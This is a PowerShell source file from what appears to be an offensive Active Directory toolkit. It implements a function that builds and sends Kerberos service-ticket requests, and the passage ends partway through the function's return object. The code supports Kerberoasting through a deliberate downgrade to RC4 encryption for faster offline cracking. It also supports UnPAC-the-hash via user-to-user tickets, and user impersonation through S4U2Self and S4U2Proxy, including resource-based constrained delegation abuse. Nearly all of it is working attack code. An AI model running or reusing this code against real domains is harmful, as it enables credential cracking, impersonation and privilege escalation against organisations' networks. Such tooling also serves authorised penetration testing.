function Request-ServiceTicket {
<#
.SYNOPSIS
    Requests a Kerberos Service Ticket (TGS) using a TGT.

.DESCRIPTION
    This function implements the TGS-REQ/TGS-REP exchange to obtain a service ticket for a specific Service Principal Name (SPN).
    It uses a previously acquired TGT to request the service ticket from the KDC.

    The function supports four distinct modes (parameter sets):
    - Normal: Standard TGS-REQ for a service ticket
    - U2U: User-to-User ticket exchange (for UnPAC-the-Hash)
    - S4U2Self: Protocol Transition (impersonate user to self)
    - S4U2Proxy: Constrained Delegation (forward impersonated ticket to target service)

    Common use cases:
    - Request LDAP service ticket: ldap/<dc>
    - Request CIFS service ticket: cifs/<server>
    - Request HTTP service ticket: http/<server>

.PARAMETER TGT
    The TGT ticket bytes (from AS-REP).

.PARAMETER SessionKey
    The session key bytes from the TGT.

.PARAMETER SessionKeyType
    The encryption type of the session key (17=AES128, 18=AES256, 23=RC4).

.PARAMETER ServicePrincipalName
    The SPN to request a ticket for (e.g., "ldap/dc01.contoso.com").

.PARAMETER Domain
    The target domain (realm).

.PARAMETER DomainController
    The KDC to send the TGS-REQ to.

.PARAMETER UserName
    The user name (cname from TGT).

.PARAMETER DowngradeToRC4
    If specified, only requests RC4 encryption (etype 23). This forces the KDC to use RC4 if the target service account supports it.
    Useful for Kerberoasting as RC4 hashes are much faster to crack than AES.

.PARAMETER RequestedEtype
    If specified, only requests this specific encryption type (17=AES128, 18=AES256, 23=RC4).
    Used internally for fallback logic in Kerberoasting.

.PARAMETER U2U
    Enables User-to-User (U2U) mode. Sets enc-tkt-in-skey KDC option and includes
    the TGT as additional-ticket. The ServicePrincipalName should be the target username
    (not an SPN). Used for UnPAC-the-hash to recover NT hash from PKINIT authentication.

.PARAMETER S4U2Self
    Enables S4U2Self (Protocol Transition) mode. Requests a service ticket to
    the service account itself on behalf of another user via PA-FOR-USER (type 129).
    Requires -ImpersonateUser. The ServicePrincipalName should be the service account's
    own username (ticket to self).

.PARAMETER ImpersonateUser
    The sAMAccountName of the user to impersonate (used with -S4U2Self).

.PARAMETER ImpersonateRealm
    The realm of the user to impersonate. Defaults to the target domain if not specified.

.PARAMETER S4U2Proxy
    Enables S4U2Proxy (Constrained Delegation) mode. Forwards a S4U2Self service ticket
    to a target service using the CnameInAddlTkt KDC option. Requires -AdditionalTicket
    containing the S4U2Self ticket bytes.

.PARAMETER AdditionalTicket
    The S4U2Self service ticket bytes to forward via S4U2Proxy. These are the raw
    Ticket APPLICATION 1 bytes from the S4U2Self TGS-REP (TicketBytes property).
    Only used with -S4U2Proxy parameter.

.PARAMETER ResourceBased
    When used with -S4U2Proxy, adds PA-PAC-OPTIONS (type 167) with the
    resource-based-constrained-delegation-allowed flag (bit 3). Required for RBCD
    but not for classic constrained delegation.

.EXAMPLE
    $tgsResult = Request-ServiceTicket -TGT $tgt.TicketBytes -SessionKey $tgt.SessionKeyBytes `
                                       -SessionKeyType 18 -ServicePrincipalName "ldap/dc01.contoso.com" `
                                       -Domain "contoso.com" -DomainController "dc01.contoso.com" `
                                       -UserName "admin"

.OUTPUTS
    PSCustomObject with service ticket and session key.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    References:
    - RFC 4120: Kerberos V5 - TGS-REQ/TGS-REP
    - MS-KILE: Microsoft Kerberos Protocol Extensions
#>
    [CmdletBinding(DefaultParameterSetName='Normal')]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateScript({ $_.Length -gt 0 })]
        [byte[]]$TGT,

        [Parameter(Mandatory=$true)]
        [ValidateScript({ $_.Length -gt 0 })]
        [byte[]]$SessionKey,

        [Parameter(Mandatory=$true)]
        [ValidateSet(17, 18, 23)]
        [int]$SessionKeyType,

        [Parameter(Mandatory=$true)]
        [string]$ServicePrincipalName,

        [Parameter(Mandatory=$true)]
        [string]$Domain,

        [Parameter(Mandatory=$true)]
        [string]$DomainController,

        [Parameter(Mandatory=$true)]
        [string]$UserName,

        [Parameter(Mandatory=$false)]
        [switch]$DowngradeToRC4,

        [Parameter(Mandatory=$false)]
        [ValidateSet(17, 18, 23)]
        [int]$RequestedEtype,

        [Parameter(Mandatory=$false, ParameterSetName='U2U')]
        [switch]$U2U,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Self')]
        [switch]$S4U2Self,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Self')]
        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [string]$ImpersonateUser,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Self')]
        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [string]$ImpersonateRealm,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [switch]$S4U2Proxy,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [ValidateScript({ $_.Length -gt 0 })]
        [byte[]]$AdditionalTicket,

        [Parameter(Mandatory=$false, ParameterSetName='S4U2Proxy')]
        [switch]$ResourceBased
    )

    begin {
        Write-Log "[Request-ServiceTicket] Starting TGS-REQ for SPN: $ServicePrincipalName"

        # Resolve DomainController to IP if custom DNS is configured (uses unified Resolve-adPEASName)
        if ($Script:LDAPContext -and $Script:LDAPContext['DnsServer']) {
            $ipTest = $null
            if (-not [System.Net.IPAddress]::TryParse($DomainController, [ref]$ipTest)) {
                # Use -Name since DomainController is explicit (no DC discovery needed)
                $ResolvedIP = Resolve-adPEASName -Name $DomainController -DnsServer $Script:LDAPContext['DnsServer']
                if ($ResolvedIP) {
                    Write-Log "[Request-ServiceTicket] Resolved $DomainController to IP: $ResolvedIP"
                    $DomainController = $ResolvedIP
                }
                else {
                    Write-Log "[Request-ServiceTicket] WARNING: Could not resolve $DomainController to IP address"
                }
            }
        }

        function New-KerberosTGSREQ {
            param(
                [byte[]]$TGT,
                [byte[]]$SessionKey,
                [int]$SessionKeyType,
                [string]$UserName,
                [string]$Realm,
                [string]$ServiceName,
                [string]$ServiceInstance,
                [switch]$U2U,
                [byte[]]$AdditionalTicket,
                [switch]$S4U2Self,
                [string]$ImpersonateUser,
                [string]$ImpersonateRealm,
                [byte[]]$S4U2SelfTicket,
                [switch]$S4U2Proxy,
                [switch]$ResourceBased
            )

            $realmUpper = $Realm.ToUpper()
            $nonce = [uint32](Get-Random -Minimum 1 -Maximum 2147483647)

            # Build Authenticator
            # Authenticator ::= [APPLICATION 2] SEQUENCE {
            #   authenticator-vno [0] INTEGER,
            #   crealm [1] Realm,
            #   cname [2] PrincipalName,
            #   cksum [3] Checksum OPTIONAL,
            #   cusec [4] Microseconds,
            #   ctime [5] KerberosTime,
            #   subkey [6] EncryptionKey OPTIONAL,
            #   seq-number [7] UInt32 OPTIONAL
            # }

            $now = [datetime]::UtcNow
            $cusec = $now.Millisecond * 1000

            # cname for authenticator
            $cname = New-KerberosPrincipalName -NameType $Script:NT_PRINCIPAL -NameStrings @($UserName)

            $authContent = @()
            $authContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)  # authenticator-vno
            $authContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $realmUpper)  # crealm
            $authContent += New-ASN1ContextTag -Tag 2 -Data $cname  # cname
            $authContent += New-ASN1ContextTag -Tag 4 -Data (New-ASN1Integer -Value $cusec)  # cusec
            $authContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $now)  # ctime

            $authSeq = New-ASN1Sequence -Data $authContent
            $authenticator = New-ASN1ApplicationTag -Tag 2 -Data $authSeq

            # Encrypt authenticator with TGT session key
            # Key usage 7 for TGS-REQ PA-TGS-REQ authenticator
            $keyUsage = 7

            # Use Windows native crypto for encryption (same as Rubeus)
            $encAuthenticator = Protect-KerberosNative -Key $SessionKey -Data $authenticator -KeyUsage $keyUsage -EncryptionType $SessionKeyType
            if (-not $encAuthenticator) {
                throw "Failed to encrypt authenticator"
            }

            # Build AP-REQ for PA-TGS-REQ
            # AP-REQ ::= [APPLICATION 14] SEQUENCE {
            #   pvno [0] INTEGER,
            #   msg-type [1] INTEGER,
            #   ap-options [2] APOptions,
            #   ticket [3] Ticket,
            #   authenticator [4] EncryptedData
            # }

            # EncryptedData for authenticator
            $encDataContent = @()
            $encDataContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $SessionKeyType)  # etype
            $encDataContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $encAuthenticator)  # cipher
            $encData = New-ASN1Sequence -Data $encDataContent

            # AP-Options (no options set)
            $apOptions = New-ASN1BitString -Value @(0x00, 0x00, 0x00, 0x00) -UnusedBits 0

            $apReqContent = @()
            $apReqContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)  # pvno
            $apReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 14)  # msg-type (AP-REQ)
            $apReqContent += New-ASN1ContextTag -Tag 2 -Data $apOptions  # ap-options
            $apReqContent += New-ASN1ContextTag -Tag 3 -Data $TGT  # ticket
            $apReqContent += New-ASN1ContextTag -Tag 4 -Data $encData  # authenticator

            $apReqSeq = New-ASN1Sequence -Data $apReqContent
            $apReq = New-ASN1ApplicationTag -Tag 14 -Data $apReqSeq

            # PA-TGS-REQ padata
            $paTgsReq = New-KerberosPAData -PADataType $Script:PA_TGS_REQ -PADataValue $apReq

            # PA-PAC-REQUEST
            $pacRequest = New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $true))
            $paPacReq = New-KerberosPAData -PADataType $Script:PA_PAC_REQUEST -PADataValue $pacRequest

            $padataItems = @($paTgsReq, $paPacReq)

            # S4U2Self: Add PA-FOR-USER (type 129) - Protocol Transition
            # MS-SFU 3.2: Requests a service ticket on behalf of another user
            if ($S4U2Self -and $ImpersonateUser) {
                $s4uRealm = if ($ImpersonateRealm) { $ImpersonateRealm.ToUpper() } else { $realmUpper }

                # PA-FOR-USER ::= SEQUENCE {
                #   userName      [0] PrincipalName (NT_ENTERPRISE=10),
                #   userRealm     [1] Realm,
                #   cksum         [2] Checksum (type -138, HMAC-MD5),
                #   auth-package  [3] KerberosString ("Kerberos")
                # }

                # Build checksum data: nameType(4LE) + name(UTF8) + realm(UTF8) + "Kerberos"(UTF8)
                $nameTypeBytes = [System.BitConverter]::GetBytes([int32]$Script:NT_ENTERPRISE)  # 4 bytes LE
                $nameBytes = [System.Text.Encoding]::UTF8.GetBytes($ImpersonateUser)
                $realmBytes = [System.Text.Encoding]::UTF8.GetBytes($s4uRealm)
                $authPkgBytes = [System.Text.Encoding]::UTF8.GetBytes("Kerberos")

                $checksumData = $nameTypeBytes + $nameBytes + $realmBytes + $authPkgBytes
                $checksumValue = Get-HMACMD5 -Key $SessionKey -Data $checksumData

                # Build Checksum structure: { cksumtype [0] Int32, checksum [1] OCTET STRING }
                $checksumContent = @()
                $checksumContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value ([int32]-138))  # HMAC-MD5 for S4U
                $checksumContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $checksumValue)
                $checksumSeq = New-ASN1Sequence -Data $checksumContent

                # Build PA-FOR-USER structure
                $paForUserContent = @()
                $userName4U = New-KerberosPrincipalName -NameType $Script:NT_ENTERPRISE -NameStrings @($ImpersonateUser)
                $paForUserContent += New-ASN1ContextTag -Tag 0 -Data $userName4U
                $paForUserContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $s4uRealm)
                $paForUserContent += New-ASN1ContextTag -Tag 2 -Data $checksumSeq
                $paForUserContent += New-ASN1ContextTag -Tag 3 -Data (New-ASN1GeneralString -Value "Kerberos")
                $paForUserSeq = New-ASN1Sequence -Data $paForUserContent

                $paForUser = New-KerberosPAData -PADataType $Script:PA_FOR_USER -PADataValue $paForUserSeq
                $padataItems += $paForUser
                Write-Log "[New-KerberosTGSREQ] Added PA-FOR-USER for '$ImpersonateUser@$s4uRealm'"
            }

            # S4U2Proxy + RBCD: Add PA-PAC-OPTIONS (type 167) with resource-based flag
            if ($S4U2Proxy -and $ResourceBased) {
                # PA-PAC-OPTIONS ::= SEQUENCE { flags [0] BIT STRING }
                # Bit 3 = resource-based-constrained-delegation-allowed (0x10000000)
                $pacOptionsFlags = [System.BitConverter]::GetBytes([uint32]0x10000000)
                [Array]::Reverse($pacOptionsFlags)  # big-endian
                $pacOptionsBitString = New-ASN1BitString -Value $pacOptionsFlags -UnusedBits 0
                $pacOptionsSeq = New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data $pacOptionsBitString)
                $paPacOptions = New-KerberosPAData -PADataType $Script:PA_PAC_OPTIONS -PADataValue $pacOptionsSeq
                $padataItems += $paPacOptions
                Write-Log "[New-KerberosTGSREQ] Added PA-PAC-OPTIONS with RBCD flag"
            }

            $padata = New-ASN1Sequence -Data ($padataItems | ForEach-Object { $_ })

            # KDC-OPTIONS for TGS-REQ
            if ($U2U) {
                # U2U: enc-tkt-in-skey tells KDC to encrypt service ticket with the additional ticket's session key
                $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -EncTktInSkey
            } elseif ($S4U2Proxy) {
                # S4U2Proxy: CnameInAddlTkt tells KDC to use the client name from the additional ticket
                $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -CnameInAddlTkt
            } else {
                $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize
            }

            # sname - service principal
            if ($U2U) {
                # U2U: sname is the target user principal (NT_UNKNOWN with just the username)
                $sname = New-KerberosPrincipalName -NameType $Script:NT_UNKNOWN -NameStrings @($ServiceName)
            } elseif ($S4U2Self) {
                # S4U2Self: sname is the service account itself (ticket to self)
                $sname = New-KerberosPrincipalName -NameType $Script:NT_UNKNOWN -NameStrings @($ServiceName)
            } else {
                $sname = New-KerberosPrincipalName -NameType $Script:NT_SRV_INST -NameStrings @($ServiceName, $ServiceInstance)
            }

            # till
            $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)

            # etype - encryption types to offer to KDC
            # Priority: RequestedEtype (specific) > DowngradeToRC4 (RC4 only) > default (all types)
            $etypeList = @()
            if ($RequestedEtype) {
                # Specific etype requested (used for fallback logic)
                $etypeList += New-ASN1Integer -Value $RequestedEtype
                Write-Log "[Request-ServiceTicket] Requesting specific etype $RequestedEtype only"
            } elseif ($DowngradeToRC4) {
                # Only offer RC4-HMAC - forces KDC to use RC4 if account supports it
                $etypeList += New-ASN1Integer -Value 23  # RC4-HMAC only
                Write-Log "[Request-ServiceTicket] Requesting RC4 downgrade (etype 23 only)"
            } else {
                # Offer all types - RC4 first (preferred for cracking), then AES
                $etypeList += New-ASN1Integer -Value 23  # RC4-HMAC (weakest - preferred for Kerberoasting)
                $etypeList += New-ASN1Integer -Value 17  # AES128-CTS-HMAC-SHA1-96
                $etypeList += New-ASN1Integer -Value 18  # AES256-CTS-HMAC-SHA1-96
            }

            # KDC-REQ-BODY
            $reqBodyContent = @()
            $reqBodyContent += New-ASN1ContextTag -Tag 0 -Data $kdcOptions
            $reqBodyContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $realmUpper)  # realm
            $reqBodyContent += New-ASN1ContextTag -Tag 3 -Data $sname  # sname
            $reqBodyContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)  # till
            $reqBodyContent += New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $nonce)  # nonce
            $reqBodyContent += New-ASN1ContextTag -Tag 8 -Data (New-ASN1Sequence -Data $etypeList)  # etype

            # additional-tickets [11]
            # U2U: Contains the TGT whose session key encrypts the service ticket
            # S4U2Proxy: Contains the S4U2Self service ticket to forward
            if ($U2U -and $AdditionalTicket) {
                $additionalTicketsSeq = New-ASN1Sequence -Data $AdditionalTicket
                $reqBodyContent += New-ASN1ContextTag -Tag 11 -Data $additionalTicketsSeq
            } elseif ($S4U2Proxy -and $S4U2SelfTicket) {
                $additionalTicketsSeq = New-ASN1Sequence -Data $S4U2SelfTicket
                $reqBodyContent += New-ASN1ContextTag -Tag 11 -Data $additionalTicketsSeq
            }

            $reqBody = New-ASN1Sequence -Data $reqBodyContent

            # KDC-REQ (TGS-REQ)
            $kdcReqContent = @()
            $kdcReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 5)  # pvno
            $kdcReqContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value $Script:KRB_TGS_REQ)  # msg-type
            $kdcReqContent += New-ASN1ContextTag -Tag 3 -Data $padata
            $kdcReqContent += New-ASN1ContextTag -Tag 4 -Data $reqBody

            $kdcReq = New-ASN1Sequence -Data $kdcReqContent

            # TGS-REQ = APPLICATION 12
            $tgsReq = New-ASN1ApplicationTag -Tag 12 -Data $kdcReq

            return @{
                TGSReq = $tgsReq
                Nonce = $nonce
            }
        }

        function Parse-TGSREP {
            param([byte[]]$Data)

            $result = @{
                Success = $false
                Error = $null
                Ticket = $null
                TicketEType = $null  # etype of the service ticket (for Kerberoasting)
                EncPart = $null
                EType = $null        # etype of the enc-part (for client)
                Kvno = $null
            }

            try {
                $root = Read-ASN1Element -Data $Data -Offset 0

                # Check for KRB-ERROR (APPLICATION 30)
                if (($root.Tag -band 0x1F) -eq 30) {
                    # APPLICATION tag wraps a SEQUENCE - parse inner sequence first
                    $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                    $children = Read-ASN1Children -Data $innerSeq.Content
                    $errorCode = $null
                    $errorText = $null

                    foreach ($child in $children) {
                        if ($child.TagNumber -eq 6) {
                            $errorCode = Read-ASN1Integer -Content (Read-ASN1Element -Data $child.Content).Content
                        }
                        elseif ($child.TagNumber -eq 12) {
                            $errorText = Read-ASN1String -Content (Read-ASN1Element -Data $child.Content).Content
                        }
                    }

                    $result.Error = "KRB-ERROR $errorCode"
                    if ($errorText) { $result.Error += ": $errorText" }

                    # Use centralized Kerberos error code mapping
                    $errorDesc = Get-KerberosErrorMessage -ErrorCode $errorCode
                    $result.Error += " ($errorDesc)"

                    return $result
                }

                # Check for TGS-REP (APPLICATION 13)
                if (($root.Tag -band 0x1F) -ne 13) {
                    $result.Error = "Unexpected response type: $($root.Tag) (expected TGS-REP)"
                    return $result
                }

                # TGS-REP is [APPLICATION 13] which wraps a SEQUENCE
                $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                $children = Read-ASN1Children -Data $innerSeq.Content

                foreach ($child in $children) {
                    switch ($child.TagNumber) {
                        5 {
                            # ticket [5] - this is the service ticket
                            $result.Ticket = $child.Content

                            # Parse the ticket to get its etype (for Kerberoasting)
                            # Ticket ::= [APPLICATION 1] SEQUENCE { tkt-vno, realm, sname, enc-part }
                            try {
                                $ticketRoot = Read-ASN1Element -Data $child.Content -Offset 0
                                # APPLICATION 1 wraps a SEQUENCE
                                $ticketSeq = Read-ASN1Element -Data $ticketRoot.Content -Offset 0
                                $ticketChildren = Read-ASN1Children -Data $ticketSeq.Content

                                foreach ($ticketChild in $ticketChildren) {
                                    if ($ticketChild.TagNumber -eq 3) {
                                        # enc-part [3] of the ticket
                                        $ticketEncPart = Read-ASN1Element -Data $ticketChild.Content
                                        $ticketEncPartChildren = Read-ASN1Children -Data $ticketEncPart.Content

                                        foreach ($tepChild in $ticketEncPartChildren) {
                                            if ($tepChild.TagNumber -eq 0) {
                                                # etype [0] - THIS is the encryption type of the service ticket
                                                # Cast to [int] for hashtable lookup compatibility (Read-ASN1Integer returns Int64)
                                                $result.TicketEType = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $tepChild.Content).Content)
                                                Write-Log "[Parse-TGSREP] Ticket etype: $($result.TicketEType)"
                                            }
                                        }
                                    }
                                }
                            } catch {
                                Write-Log "[Parse-TGSREP] Failed to parse ticket etype: $_"
                            }
                        }
                        6 {
                            # enc-part [6] - encrypted part for the client
                            $encPartSeq = Read-ASN1Element -Data $child.Content
                            $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content

                            foreach ($encChild in $encPartChildren) {
                                if ($encChild.TagNumber -eq 0) {
                                    # Cast to [int] for hashtable lookup compatibility
                                    $result.EType = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content)
                                }
                                elseif ($encChild.TagNumber -eq 1) {
                                    $result.Kvno = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content)
                                }
                                elseif ($encChild.TagNumber -eq 2) {
                                    $result.EncPart = (Read-ASN1Element -Data $encChild.Content).Content
                                }
                            }
                        }
                    }
                }

                $result.Success = $true
            }
            catch {
                $result.Error = "Failed to parse TGS-REP: $_"
            }

            return $result
        }

        function Parse-EncTGSRepPart {
            param(
                [byte[]]$Data,
                [byte[]]$Key,
                [int]$EType
            )

            # Key usage 8 for TGS-REP encrypted part (when encrypted with TGT session key)
            $keyUsage = 8

            try {
                switch ($EType) {
                    23 { $decrypted = Decrypt-RC4HMAC -Key $Key -CipherText $Data -KeyUsage $keyUsage }
                    17 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
                    18 { $decrypted = Decrypt-AESCTS -Key $Key -CipherText $Data -KeyUsage $keyUsage }
                    default { throw "Unsupported encryption type: $EType" }
                }
            }
            catch {
                return @{ Success = $false; Error = "Decryption failed: $_" }
            }

            $result = @{
                Success = $true
                SessionKey = $null
                SessionKeyType = $null
                TicketFlags = $null
                AuthTime = $null
                StartTime = $null
                EndTime = $null
                RenewTill = $null
            }

            try {
                $root = Read-ASN1Element -Data $decrypted

                # EncTGSRepPart is [APPLICATION 26] which contains a SEQUENCE
                $contentToParse = $root.Content
                if ($root.Tag -eq 0x30) {
                    # Already a SEQUENCE - use directly
                    $contentToParse = $root.Content
                } else {
                    # APPLICATION tag wrapping a SEQUENCE
                    $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                    $contentToParse = $innerSeq.Content
                }

                $children = Read-ASN1Children -Data $contentToParse

                # EncKDCRepPart structure (RFC 4120):
                # key             [0] EncryptionKey,
                # last-req        [1] LastReq,
                # nonce           [2] UInt32,
                # key-expiration  [3] KerberosTime OPTIONAL,
                # flags           [4] TicketFlags,
                # authtime        [5] KerberosTime,
                # starttime       [6] KerberosTime OPTIONAL,
                # endtime         [7] KerberosTime,
                # renew-till      [8] KerberosTime OPTIONAL,

                foreach ($child in $children) {
                    switch ($child.TagNumber) {
                        0 {
                            # key [0] EncryptionKey
                            $keySeq = Read-ASN1Element -Data $child.Content
                            $keyChildren = Read-ASN1Children -Data $keySeq.Content

                            foreach ($keyChild in $keyChildren) {
                                if ($keyChild.TagNumber -eq 0) {
                                    $result.SessionKeyType = Read-ASN1Integer -Content (Read-ASN1Element -Data $keyChild.Content).Content
                                }
                                elseif ($keyChild.TagNumber -eq 1) {
                                    $result.SessionKey = (Read-ASN1Element -Data $keyChild.Content).Content
                                }
                            }
                        }
                        4 {
                            # flags [4] TicketFlags (BIT STRING, 4 bytes)
                            $flagElement = Read-ASN1Element -Data $child.Content
                            # BIT STRING: first byte is number of unused bits, remaining bytes are the flag data
                            if ($flagElement.Content.Length -ge 5) {
                                $result.TicketFlags = $flagElement.Content[1..4]
                            } elseif ($flagElement.Content.Length -eq 4) {
                                $result.TicketFlags = $flagElement.Content
                            }
                        }
                        5 {
                            # authtime [5] KerberosTime
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.AuthTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                        6 {
                            # starttime [6] KerberosTime OPTIONAL
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.StartTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                        7 {
                            # endtime [7] KerberosTime
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.EndTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                        8 {
                            # renew-till [8] KerberosTime OPTIONAL
                            $timeElement = Read-ASN1Element -Data $child.Content
                            $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                            $result.RenewTill = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                        }
                    }
                }
            }
            catch {
                $result.Success = $false
                $result.Error = "Failed to parse EncTGSRepPart: $_"
            }

            return $result
        }
    }

    process {
        try {
            $realmUpper = $Domain.ToUpper()

            # Validate S4U parameters
            if ($S4U2Self -and -not $ImpersonateUser) {
                throw "S4U2Self requires -ImpersonateUser parameter"
            }
            if ($S4U2Proxy -and -not $AdditionalTicket) {
                throw "S4U2Proxy requires -AdditionalTicket parameter (S4U2Self service ticket bytes)"
            }
            if ($ResourceBased -and -not $S4U2Proxy) {
                throw "ResourceBased requires -S4U2Proxy switch to be set"
            }

            if ($U2U) {
                # U2U: ServicePrincipalName is the target username, no SPN parsing needed
                $serviceName = $ServicePrincipalName
                $serviceInstance = $null
                Write-Log "[Request-ServiceTicket] Requesting U2U TGS for user '$ServicePrincipalName' via $DomainController (etype $SessionKeyType)"
            } elseif ($S4U2Self) {
                # S4U2Self: ServicePrincipalName is the service account username (ticket to self)
                $serviceName = $ServicePrincipalName
                $serviceInstance = $null
                Write-Log "[Request-ServiceTicket] Requesting S4U2Self TGS on behalf of '$ImpersonateUser' via $DomainController (etype $SessionKeyType)"
            } elseif ($S4U2Proxy) {
                # S4U2Proxy: Parse SPN normally (target service)
                $spnParts = $ServicePrincipalName -split '/'
                if ($spnParts.Count -lt 2) {
                    throw "Invalid SPN format. Expected: service/instance (e.g., ldap/dc01.contoso.com)"
                }
                $serviceName = $spnParts[0]
                $serviceInstance = $spnParts[1..($spnParts.Count-1)] -join '/'
                Write-Log "[Request-ServiceTicket] Requesting S4U2Proxy TGS for $ServicePrincipalName via $DomainController (etype $SessionKeyType)"
            } else {
                # Normal TGS: Parse SPN into service/instance
                $spnParts = $ServicePrincipalName -split '/'
                if ($spnParts.Count -lt 2) {
                    throw "Invalid SPN format. Expected: service/instance (e.g., ldap/dc01.contoso.com)"
                }
                $serviceName = $spnParts[0]
                $serviceInstance = $spnParts[1..($spnParts.Count-1)] -join '/'
                Write-Log "[Request-ServiceTicket] Requesting TGS for $ServicePrincipalName via $DomainController (etype $SessionKeyType)"
            }

            # Build TGS-REQ
            $tgsReqParams = @{
                TGT = $TGT
                SessionKey = $SessionKey
                SessionKeyType = $SessionKeyType
                UserName = $UserName
                Realm = $Domain
                ServiceName = $serviceName
                ServiceInstance = $serviceInstance
            }
            if ($U2U) {
                $tgsReqParams['U2U'] = $true
                $tgsReqParams['AdditionalTicket'] = $TGT  # TGT is the additional ticket for U2U
            }
            if ($S4U2Self) {
                $tgsReqParams['S4U2Self'] = $true
                $tgsReqParams['ImpersonateUser'] = $ImpersonateUser
                if ($ImpersonateRealm) { $tgsReqParams['ImpersonateRealm'] = $ImpersonateRealm }
            }
            if ($S4U2Proxy) {
                $tgsReqParams['S4U2Proxy'] = $true
                $tgsReqParams['S4U2SelfTicket'] = $AdditionalTicket
                if ($ResourceBased) { $tgsReqParams['ResourceBased'] = $true }
            }
            $tgsReqResult = New-KerberosTGSREQ @tgsReqParams
            $tgsReqBytes = $tgsReqResult.TGSReq

            Write-Log "[Request-ServiceTicket] TGS-REQ built ($($tgsReqBytes.Length) bytes), sending to KDC..."

            # Send to KDC
            $responseBytes = Send-KerberosRequest -Server $DomainController -Request $tgsReqBytes

            Write-Log "[Request-ServiceTicket] Received response ($($responseBytes.Length) bytes)"

            # Parse TGS-REP
            $tgsRep = Parse-TGSREP -Data $responseBytes

            if (-not $tgsRep.Success) {
                throw $tgsRep.Error
            }

            Write-Log "[Request-ServiceTicket] TGS-REP received (ticket etype: $($tgsRep.TicketEType), enc-part etype: $($tgsRep.EType))"

            # Decrypt enc-part to get service session key
            $encRepPart = Parse-EncTGSRepPart -Data $tgsRep.EncPart -Key $SessionKey -EType $tgsRep.EType

            if (-not $encRepPart.Success) {
                Write-Warning "[!] Failed to decrypt enc-part: $($encRepPart.Error)"
                Write-Warning "[!] Continuing with ticket (session key unknown)..."
                $serviceSessionKey = $null
            } else {
                $serviceSessionKey = $encRepPart.SessionKey
                Write-Log "[Request-ServiceTicket] Service session key extracted ($($serviceSessionKey.Length) bytes, type $($encRepPart.SessionKeyType))"
            }

            # Build result
            $ticketB64 = [Convert]::ToBase64String($tgsRep.Ticket)
            $sessionKeyB64 = if ($serviceSessionKey) { [Convert]::ToBase64String($serviceSessionKey) } else { $null }

            # Use TicketEType for Kerberoasting (the actual ticket encryption), fallback to EType if not parsed
            $ticketEncryptionType = if ($tgsRep.TicketEType) { $tgsRep.TicketEType } else { $tgsRep.EType }

            return [PSCustomObject]@{
                Success = $true
                ServicePrincipalName = $ServicePrincipalName
                Domain = $realmUpper
                DomainController = $DomainController
                EncryptionType = $ticketEncryptionType  # Ticket etype (for Kerberoasting)
                EncPartEType = $tgsRep.EType            # Enc-part etype (for client)
                Ticket = $ticketB64
                TicketBytes = $tgsRep.Ticket
                SessionKey = $sessionKeyB64
